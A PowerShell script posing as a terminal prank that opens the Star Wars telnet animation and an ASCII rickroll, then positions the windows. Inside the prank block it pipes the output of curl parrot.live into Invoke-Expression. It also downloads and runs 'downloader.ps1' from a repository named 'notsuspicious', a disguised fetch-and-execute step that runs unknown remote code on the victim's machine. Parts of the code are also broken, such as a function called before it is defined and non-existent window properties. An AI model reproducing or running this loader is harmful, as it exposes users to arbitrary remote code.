# Find existing PowerShell window
$psWindow = Get-Process -Name powershell | Where-Object { $_.MainWindowTitle -ne "" }

if ($psWindow) {
    # Start Star Wars in a new Command Prompt window to the left
    Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
    # Start rickroll in ASCII in a new Command Prompt window to the right
    Start-Process cmd -ArgumentList "/c start cmd /k curl -L http://artscene.textfiles.com/asciiart/musicsongs/nevergonna.txt" -WindowStyle Normal

    # Move the Star Wars window 200px to the left of the PowerShell window
    $leftPos = $psWindow.MainWindowLeft - 200
    Move-Window -ProcessName "cmd" -Left $leftPos -Top $psWindow.MainWindowTop -Width 800 -Height 600

    # Move the rickroll window 200px to the right of the PowerShell window
    $rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 200
    Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600

    # Curl parrot.live in the found PowerShell window
    Invoke-Expression (curl parrot.live)

    # Execute PowerShell command
    Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content
} else {
    Write-Host "PowerShell window not found."
}

Function Move-Window {
    param (
        [string]$ProcessName,
        [int]$Left,
        [int]$Top,
        [int]$Width,
        [int]$Height
    )

    $window = Get-Process | Where-Object { $_.MainWindowTitle -eq "$ProcessName" }

    if ($window) {
        $hwnd = $window.MainWindowHandle
        $rect = New-Object RECT
        $user32 = Add-Type -Name user32 -Namespace Win32 -PassThru -MemberDefinition '
            [DllImport("user32.dll")]
            public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
            [DllImport("user32.dll")]
            public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
            public struct RECT
            {
                public int Left;
                public int Top;
                public int Right;
                public int Bottom;
            }
        '
        $user32::GetWindowRect($hwnd, [ref]$rect)
        $user32::MoveWindow($hwnd, $Left, $Top, $Width, $Height, $true)
    } else {
        Write-Host "$ProcessName window not found."
    }
}